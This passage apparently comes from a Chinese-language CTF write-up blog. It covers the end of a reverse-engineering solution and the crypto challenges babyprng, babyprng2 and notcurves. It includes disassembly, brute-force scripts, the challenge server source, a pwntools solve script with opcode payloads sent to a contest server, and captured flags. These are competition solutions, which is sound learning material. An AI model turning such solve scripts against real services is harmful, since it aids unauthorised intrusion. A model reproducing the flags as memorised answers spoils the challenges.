class="line">;...</span><br><span class="line">.text:5655AA95 mov     ecx, [ebp-18Ch]</span><br><span class="line">.text:5655AA9B add     ecx, eax</span><br><span class="line">;...</span><br><span class="line">.text:5655AAC7 mov     [ebp-18Ch], ecx        ; m[i][j]*c[i][j]</span><br><span class="line">.text:5655AACD jmp     loc_5655A818           ; j++</span><br></pre></td></tr></table></figure><p>其实就是两个矩阵对应元素相乘，同一行再相加</p><p>外循环干的事：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:5655AB0A mov     eax, [ebp-4]           ; i</span><br><span class="line">.text:5655AB0D shl     eax, 2</span><br><span class="line">;...</span><br><span class="line">.text:5655AB4C lea     ecx, [ebp-180h]        ; flag</span><br><span class="line">.text:5655AB52 add     ecx, eax</span><br><span class="line">;...</span><br><span class="line">.text:5655AB83 mov     eax, [ebp-18Ch]        ; the result of every row</span><br><span class="line">.text:5655AB89 mov     [ecx], eax</span><br><span class="line">.text:5655AB8B jmp     loc_5655A565           ; i++</span><br></pre></td></tr></table></figure><p>那么加完的内容就是最后要输出的东西了，开始穷举：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line">res = [[<span class="number">0x0D481DD44</span>, <span class="number">0x0E66CF0E0</span>], [<span class="number">0x6C86565D</span>, <span class="number">0x0EF6C2A6D</span>], [<span class="number">0x0D170230A</span>, <span class="number">0x9159B169</span>], [<span class="number">0x3DCF0D3F</span>, <span class="number">0x0D9331E76</span>], [<span class="number">0x64691AF0</span>, <span class="number">0x0DBF384CF</span>], [<span class="number">0x69E3E3A</span>, <span class="number">0x7122DE4D</span>]]</span><br><span class="line">constmat = [<span class="number">0x0B849CD19</span>, <span class="number">0x55E00017</span>, <span class="number">0x844966B</span>, <span class="number">0x80C181EC</span>, <span class="number">0x686C0B3C</span>, <span class="number">0x55400592</span>, <span class="number">0x0CD42168A</span>, <span class="number">0x4039E81</span>, <span class="number">0x0D9DE549F</span>, <span class="number">0x2034677D</span>, <span class="number">0x144ABD</span>, <span class="number">0x49100D00</span>, <span class="number">0x0E003A0E0</span>, <span class="number">0x80F0006D</span>, <span class="number">0x8307ADD6</span>, <span class="number">0x4CF60781</span>, <span class="number">0x0A0352643</span>, <span class="number">0x0C580C3DE</span>, <span class="number">0x0EA8C4E24</span>, <span class="number">0x68603008</span>, <span class="number">0x687FBFFF</span>, <span class="number">0x19DE4BF9</span>, <span class="number">0x271A1179</span>, <span class="number">0x99791C4D</span>, <span class="number">0x29CBFFC</span>, <span class="number">0x2B82801E</span>, <span class="number">0x3C0307FB</span>, <span class="number">0x0DAE61CD6</span>, <span class="number">0x8F7B1BF0</span>, <span class="number">0x0C56CEF1D</span>, <span class="number">0x0D6493A96</span>, <span class="number">0x1808018</span>, <span class="number">0x0F48001B9</span>, <span class="number">0x3712519</span>, <span class="number">0x9294F318</span>, <span class="number">0x6DE20384</span>, <span class="number">0x0F3750B04</span>, <span class="number">0x256A122A</span>, <span class="number">0x257290B</span>, <span class="number">0x0C4582056</span>, <span class="number">0x204E8BC0</span>, <span class="number">0x79C7ADE7</span>, <span class="number">0x0C4C20203</span>, <span class="number">0x5B961570</span>, <span class="number">0x66034856</span>, <span class="number">0x78329E3A</span>, <span class="number">0x1D07C00</span>, <span class="number">0x4AC240E6</span>, <span class="number">0x854CFBBE</span>, <span class="number">0x0ABFEC404</span>, <span class="number">0x5BD80037</span>, <span class="number">0x0E94CBCD8</span>, <span class="number">0x1</span>, <span class="number">0x0C4CA280D</span>]</span><br><span class="line">a= [[[<span class="number">0xfdfe0ba1</span>, <span class="number">0x7b33a8bb</span>, <span class="number">0x3dc4ee74</span>, <span class="number">0x3e1637a6</span>],[<span class="number">0x51329f58</span>, <span class="number">0x6f7b9915</span>, <span class="number">0x2c55324</span>, <span class="number">0x43846281</span>],<span class="number">0xdf7502ce</span>],[[<span class="number">0xc96f3527</span>, <span class="number">0x51ef954</span>, <span class="number">0x715a634c</span>, <span class="number">0x9335d185</span>], [<span class="number">0xf5201fcd</span>, <span class="number">0xdb8e3ef9</span>, <span class="number">0xeb1a8529</span>, <span class="number">0x9a3b536d</span>],<span class="number">0x9967f311</span>],[[<span class="number">0x9b009084</span>, <span class="number">0x18952236</span>, <span class="number">0xbd7faf0f</span>, <span class="number">0x83bc3205</span>], [<span class="number">0xc381e2cd</span>, <span class="number">0x98936ff0</span>, <span class="number">0xc3df1016</span>, <span class="number">0x94c6bf5a</span>], <span class="number">0xdc9e8f3c</span>],[[<span class="number">0x22b35be4</span>, <span class="number">0x3372486a</span>, <span class="number">0xedd9d6d1</span>, <span class="number">0xfb9ca491</span>], [<span class="number">0x91fb13ab</span>, <span class="number">0x80f07b8d</span>, <span class="number">0xad254c2e</span>, <span class="number">0x1aef5581</span>], <span class="number">0xfe32ed8f</span>],[[<span class="number">0x9cf903a1</span>, <span class="number">0x9b555a08</span>, <span class="number">0xb9cc1351</span>, <span class="number">0x591685ae</span>], [<span class="number">0xfe217f1c</span>, <span class="number">0xa9b44eaf</span>, <span class="number">0x259911b0</span>, <span class="number">0xf54c810c</span>], <span class="number">0x19382448</span>],[[<span class="number">0x5f2f456e</span>, <span class="number">0xfb67fe21</span>, <span class="number">0xbc1220f9</span>, <span class="number">0xf49ad883</span>], [<span class="number">0x9a915052</span>, <span class="number">0x4550e6ae</span>, <span class="number">0x9b0b7b06</span>, <span class="number">0xfadb2b18</span>], <span class="number">0xfb5a012f</span>]]</span><br><span class="line">m = permutations([<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],<span class="number">4</span>)</span><br><span class="line">n = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    n.append(i)</span><br><span class="line">cont = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">    print(<span class="string">''</span>)</span><br><span class="line">    print(<span class="string">'#########part %d#########'</span>%i)</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> n:</span><br><span class="line">        <span class="keyword">for</span> q <span class="keyword">in</span> n:</span><br><span class="line">            cont+=<span class="number">1</span></span><br><span class="line">            ress = <span class="string">''</span></span><br><span class="line">            resr = []</span><br><span class="line">            resr.append(a[i][<span class="number">0</span>][p[<span class="number">0</span>]])</span><br><span class="line">            resr.append(a[i][<span class="number">1</span>][q[<span class="number">0</span>]])</span><br><span class="line">            resr.append(a[i][<span class="number">0</span>][p[<span class="number">1</span>]])</span><br><span class="line">            resr.append(a[i][<span class="number">1</span>][q[<span class="number">1</span>]])</span><br><span class="line">            resr.append(a[i][<span class="number">2</span>])</span><br><span class="line">            resr.append(a[i][<span class="number">1</span>][q[<span class="number">2</span>]])</span><br><span class="line">            resr.append(a[i][<span class="number">0</span>][p[<span class="number">2</span>]])</span><br><span class="line">            resr.append(a[i][<span class="number">1</span>][q[<span class="number">3</span>]])</span><br><span class="line">            resr.append(a[i][<span class="number">0</span>][p[<span class="number">3</span>]])</span><br><span class="line">            sumr = <span class="number">0</span></span><br><span class="line">            check0 = resr[<span class="number">0</span>]+resr[<span class="number">2</span>]+resr[<span class="number">4</span>]+resr[<span class="number">6</span>]+resr[<span class="number">8</span>]</span><br><span class="line">            check0&amp;=<span class="number">0xffffffff</span></span><br><span class="line">            check1 = resr[<span class="number">1</span>]+resr[<span class="number">3</span>]+resr[<span class="number">4</span>]+resr[<span class="number">5</span>]+resr[<span class="number">7</span>]</span><br><span class="line">            check1&amp;=<span class="number">0xffffffff</span></span><br><span class="line">            <span class="keyword">if</span>  check0 != res[i][<span class="number">0</span>]:</span><br><span class="line">                print(i)</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> resr:</span><br><span class="line">                    print(hex(k))</span><br><span class="line">                print(<span class="string">''</span>)</span><br><span class="line">                print(hex(check0))</span><br><span class="line">                print(hex(res[i][<span class="number">0</span>]))</span><br><span class="line">                print(p)</span><br><span class="line">                print(q)</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">assert</span> check0 == res[i][<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">assert</span> check1 == res[i][<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(len(resr)):</span><br><span class="line">                sumr+=resr[k]*constmat[i*<span class="number">9</span>+k]</span><br><span class="line">                sumr&amp;=<span class="number">0xFFFFFFFF</span></span><br><span class="line">            ff = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">                temp = sumr&amp;<span class="number">0xFF</span></span><br><span class="line">                <span class="keyword">if</span> temp &lt; <span class="number">0x20</span> <span class="keyword">or</span> temp &gt;= <span class="number">0x7f</span>:</span><br><span class="line">                    ff = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                ress+=chr(temp)</span><br><span class="line">                sumr&gt;&gt;=<span class="number">8</span></span><br><span class="line">            <span class="keyword">if</span> ff == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            print(ress)</span><br></pre></td></tr></table></figure><p>把输出按语义拼接一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt;uG8   \w8]   J|@&gt;   Oh)!   ye$B   ukxG</span><br><span class="line">xU&quot;a   Gj3o   S_Cu   &#125;]nU   h`1)   uHnr</span><br><span class="line">W8F?   &#123;7h1   X4G\   63_i   *[T3   ;73-</span><br><span class="line">P[jk   KP6o   Xp,T   -gF:   s_m4   a/_j</span><br><span class="line">|/Zj   v9E[   oeps   -S96   \Q&#125;]   g1c&#125;</span><br><span class="line">:!);   B::(   &apos;-SR   ERNJ   gJO(   AR&amp;|</span><br><span class="line">*CTF   a&apos;/0   SA;V   nL?K   SZL    4nEE</span><br><span class="line">uP@J   uk6W   @GhI   RV&amp;b   &quot;-R!   YOcm</span><br><span class="line">erkU   XP#3          2\t$   5zB(   AkT6</span><br><span class="line">Mc=F   hx-A          Q7^&lt;          -l/l</span><br><span class="line">;|.b   X .;          &lt;1I7          YctL</span><br><span class="line">=!M3   4gjL          1I@B          VRae</span><br><span class="line">A6V\   /_&quot;u          jke&amp;</span><br><span class="line">k?!R   ^I;-</span><br><span class="line">       :q(V</span><br><span class="line"></span><br><span class="line">*CTF&#123;7h1S_Cu63_is_m4g1c&#125;</span><br></pre></td></tr></table></figure><h4><span id="总结">总结</span></h4><p>因为刚开始学花指令，没找去除冗余代码的方法，脚本写不出来，所以干脆就纯看汇编做的，感觉方法比较蠢，需要胆大心细，但是做的过程中也多多少少对这种混淆的方法有了一定的了解，有空的话深究一下高级一点去花方法。</p><p>此外，比赛时并没有发现这道题的算法是什么，赛后跟大牛交流了一下其实这是一个魔方，6*9个元素对应6个面每个面9个块，18种输入对应18种标准魔方的操作，每个面顺时针逆时针旋转90度加3个中间块的两个方向旋转90度。不过知道是魔方之后也想不到有什么很好的解决方法。颜色不知道，最终还原的魔方的状态也不知道，只知道还原的魔方能过check。<br>还有一点，由于魔方边块和角块必须是挨着的，在矩阵上就能满足某种特定的规则，这样在我之前的穷举时就能去除那些不紧挨的情况了，可能最终的输出会被缩小很多，如果遇到flag没有语义的情况会有优势。</p><h2><span id="crypto">crypto</span></h2><h3><span id="babyprng">babyprng</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,random,sys,string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> SocketServer</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span><span class="params">(SocketServer.BaseRequestHandler)</span>:</span></span><br><span class="line">    TH = <span class="number">0.9</span> <span class="comment"># overwritten!!</span></span><br><span class="line">    DELTA = <span class="number">0.005</span></span><br><span class="line">    SIZE = <span class="number">100000</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">(self)</span>:</span></span><br><span class="line">        random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">        proof = <span class="string">''</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">20</span>)])</span><br><span class="line">        digest = sha256(proof).hexdigest()</span><br><span class="line">        self.request.send(<span class="string">"sha256(XXXX+%s) == %s\n"</span> % (proof[<span class="number">4</span>:],digest))</span><br><span class="line">        self.request.send(<span class="string">'Give me XXXX:'</span>)</span><br><span class="line">        x = self.request.recv(<span class="number">10</span>)</span><br><span class="line">        x = x.strip()</span><br><span class="line">        <span class="keyword">if</span> len(x) != <span class="number">4</span> <span class="keyword">or</span> sha256(x+proof[<span class="number">4</span>:]).hexdigest() != digest: </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recvhex</span><span class="params">(self, sz)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = sz</span><br><span class="line">            res = <span class="string">''</span></span><br><span class="line">            <span class="keyword">while</span> r&gt;<span class="number">0</span>:</span><br><span class="line">                res += self.request.recv(r)</span><br><span class="line">                <span class="keyword">if</span> res.endswith(<span class="string">'\n'</span>):</span><br><span class="line">                    r = <span class="number">0</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    r = sz - len(res)</span><br><span class="line">            res = res.strip()</span><br><span class="line">            res = res.decode(<span class="string">'hex'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            res = <span class="string">''</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dosend</span><span class="params">(self, msg)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randbit</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> random.random()&gt;self.TH:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self, code)</span>:</span></span><br><span class="line">        stack = []</span><br><span class="line">        out = []</span><br><span class="line">        cnt = <span class="number">0</span></span><br><span class="line">        random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">        self.TH = <span class="number">0.7</span> + random.random()*<span class="number">0.25</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(self.SIZE):</span><br><span class="line">            stack.append(self.randbit())</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pos = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(self.SIZE*<span class="number">10</span>):</span><br><span class="line">                c = code[pos]</span><br><span class="line">                pos += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> c==<span class="string">'\x00'</span>:</span><br><span class="line">                    out.append(stack[<span class="number">-1</span>])</span><br><span class="line">                <span class="keyword">elif</span> c==<span class="string">'\x01'</span>:</span><br><span class="line">                    <span class="keyword">if</span> stack[<span class="number">-1</span>]==<span class="number">1</span>:</span><br><span class="line">                        pos += <span class="number">1</span></span><br><span class="line">                <span class="keyword">elif</span> c==<span class="string">'\x02'</span>:</span><br><span class="line">                    <span class="keyword">del</span> stack[<span class="number">-1</span>]</span><br><span class="line">                <span class="keyword">elif</span> c==<span class="string">'\x03'</span>:</span><br><span class="line">                    stack[<span class="number">-1</span>] = stack[<span class="number">-1</span>]&amp;stack[<span class="number">-2</span>]</span><br><span class="line">                <span class="keyword">elif</span> c==<span class="string">'\x04'</span>:</span><br><span class="line">                    stack[<span class="number">-1</span>] = stack[<span class="number">-1</span>]|stack[<span class="number">-2</span>]</span><br><span class="line">                <span class="keyword">elif</span> c==<span class="string">'\x05'</span>:</span><br><span class="line">                    stack[<span class="number">-1</span>] = stack[<span class="number">-1</span>]^stack[<span class="number">-2</span>]</span><br><span class="line">                <span class="comment">#elif c=='\x06':</span></span><br><span class="line">                <span class="comment">#    stack[-1] = 1-stack[-1]</span></span><br><span class="line">                <span class="comment">#elif c=='\x06':</span></span><br><span class="line">                <span class="comment">#    stack.append(stack[-1])</span></span><br><span class="line">                <span class="keyword">elif</span> ord(c)&gt;=<span class="number">0x10</span> <span class="keyword">and</span> ord(c)&lt;=<span class="number">0x30</span>:</span><br><span class="line">                    pos += ord(c)<span class="number">-0x10</span></span><br><span class="line">                <span class="keyword">elif</span> ord(c)&gt;=<span class="number">0x30</span> <span class="keyword">and</span> ord(c)&lt;=<span class="number">0x50</span>:</span><br><span class="line">                    pos -= ord(c)<span class="number">-0x30</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.proof_of_work():</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        signal.alarm(<span class="number">3</span>)</span><br><span class="line">        self.dosend(<span class="string">"opcode(hex): "</span>)</span><br><span class="line">        code = self.recvhex(<span class="number">400</span>)</span><br><span class="line">        out = self.run(code)</span><br><span class="line">        <span class="keyword">print</span> len(out)</span><br><span class="line">        <span class="keyword">if</span> len(out) &gt; int(self.SIZE*<span class="number">0.9</span>):</span><br><span class="line">            one = float(len(filter(<span class="keyword">lambda</span> x:x==<span class="number">1</span>,out)))/len(out)</span><br><span class="line">            <span class="keyword">print</span> one</span><br><span class="line">            <span class="keyword">if</span> abs(one<span class="number">-0.5</span>)&lt;self.DELTA:</span><br><span class="line">                self.dosend(<span class="string">"%s\n"</span> % FLAG)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.dosend(<span class="string">"&gt;.&lt;\n"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.dosend(<span class="string">"&gt;.&lt;\n"</span>)</span><br><span class="line">        self.request.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkingServer</span><span class="params">(SocketServer.ForkingTCPServer, SocketServer.TCPServer)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    HOST, PORT = <span class="string">'0.0.0.0'</span>, <span class="number">10002</span></span><br><span class="line">    <span class="keyword">print</span> HOST</span><br><span class="line">    <span class="keyword">print</span> PORT</span><br><span class="line">    server = ForkingServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="keyword">True</span></span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><p> 就是个调整概率的游戏，把1的占有率调到%49.5 —- %50.5就win</p><p>首先随机生成10万个01装进stack<br>再进行100万次操作，使得最后的stack中1的占比在%49.5 —- %50.5 to win<br>利用其他操作 包括跳转和&amp;|^构造精确的所需要的stack内容<br>脚本如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">target = remote(<span class="string">"34.92.185.118"</span>, <span class="number">10002</span>)</span><br><span class="line"></span><br><span class="line">target.recvuntil(<span class="string">"sha256(XXXX+"</span>)</span><br><span class="line">salt = target.recv(<span class="number">16</span>)</span><br><span class="line">target.recvuntil(<span class="string">") == "</span>)</span><br><span class="line">digest = target.recv(<span class="number">64</span>)</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sha256</span><span class="params">(s)</span>:</span></span><br><span class="line">    s = hashlib.sha256(s).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    s = <span class="string">''</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">4</span>)])</span><br><span class="line">    <span class="keyword">if</span> sha256(s + salt) == digest:</span><br><span class="line">        result = s</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">target.recvuntil(<span class="string">"Give me XXXX:"</span>)</span><br><span class="line">target.sendline(result)</span><br><span class="line">target.recvuntil(<span class="string">"opcode(hex): "</span>)</span><br><span class="line">payload = <span class="string">"\x02\x04\x01\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x03\x01\x11\x35\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x50"</span></span><br><span class="line">payload = payload.encode(<span class="string">"hex"</span>)</span><br><span class="line">target.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> target.recv()</span><br><span class="line">target.close()</span><br></pre></td></tr></table></figure><blockquote><p>*ctf{23bb9d2dc5eebadb04ea0f9cfbc1043f}</p></blockquote><h3><span id="babyprng2">babyprng2</span></h3><p>类似上一题，不过这一题append进out之后会del掉，所以不好控制输出相同数量的0和1<br>最后的想法是先用或运算增加1的数量，然后将1和0分别放进sequence的前面和后面，反序输入回stack后再输出到out，通过无效的操作消耗100W次操作上限，将1输出完之后将0的输出控制在跟1差不多的数量，因为随机数多所以无法保证每一次都能控制的刚好 -_- ，最后写出来的脚本也只是有可能 getflag(可能欧皇一次就通了)，脚本如上题，修改payload和端口即可：<br>payload = “\x03\x03\x01\x12\x06\x11\x05\x07\x11\x3a\x08\x03\x11\x33\x03\x03\x03\x00\x36”</p><blockquote><p>*ctf{e48af588d4b80ade5ad44a8b5c90d222}</p></blockquote><h3><span id="notcurves">notcurves</span></h3><p>非预期解…因为捕获异常会置0，而且0%p==0，所以直接整个不符合格式的point就可以了</p><blockquote><p>*ctf{2ca55eb39e6fd9e5f1e7396b5c24a352}</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;De1ta-Team&quot;&gt;&lt;a href=&quot;#De1ta-Team&quot; class=&quot;headerlink&quot; title=&quot;De1ta-Team&quot;&gt;&lt;/a&gt;&lt;strong&gt;De1ta-Team&lt;/strong&gt;&lt;/h1&gt;
    
    </summary>
    
    
      <category term="\*ctf" scheme="https://blog.de1ta.com/tags/ctf/"/>
    
      <category term="ctf" scheme="https://blog.de1ta.com/tags/ctf/"/>
    
      <category term="re" scheme="https://blog.de1ta.com/tags/re/"/>
    
      <category term="web" scheme="https://blog.de1ta.com/tags/web/"/>
    
      <category term="crypto" scheme="https://blog.de1ta.com/tags/crypto/"/>
    
      <category term="pwn" scheme="https://blog.de1ta.com/tags/pwn/"/>
    
      <category term="misc" scheme="https://blog.de1ta.com/tags/misc/"/>
    
      <category term="writeup" scheme="https://blog.de1ta.com/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>HCTF 2018 Writeup</title>
    <link href="https://blog.de1ta.com/2018/11/12/HCTF2018/"/>
    <id>https://blog.de1ta.com/2018/11/12/HCTF2018/</id>
    <published>2018-11-12T04:03:00.000Z</published>
    <updated>2020-05-07T04:29:49.201Z</updated>
    
